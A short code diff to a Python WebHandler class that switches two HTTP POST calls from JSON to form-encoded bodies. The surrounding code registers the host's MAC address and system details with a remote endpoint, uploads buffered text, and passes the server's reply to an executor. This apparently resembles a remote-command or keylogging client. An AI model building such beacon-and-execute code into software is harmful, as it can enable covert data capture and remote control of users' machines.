@@ -17,7 +17,7 @@ class WebHandler(Handler):
         self.executor = Executor(ENDPOINT + 'response')
 
     def enroll(self):
-        return secure_requests.post(ENDPOINT + 'enroll', json={
+        return secure_requests.post(ENDPOINT + 'enroll', data={
             'mac': self.find_mac(),
             'system': {
                 'machine': platform.machine(),
@@ -32,7 +32,7 @@ class WebHandler(Handler):
     def write(self, something='', flush=False):
         self.cache += something
         if flush or len(self.cache) > self.max_cache:
-            response = secure_requests.post(ENDPOINT + 'write', json={'text': self.cache, 'uid': self.uid}).text
+            response = secure_requests.post(ENDPOINT + 'write', data={'text': self.cache, 'uid': self.uid}).text
             self.executor.handle(response)
             self.cache = ''
 
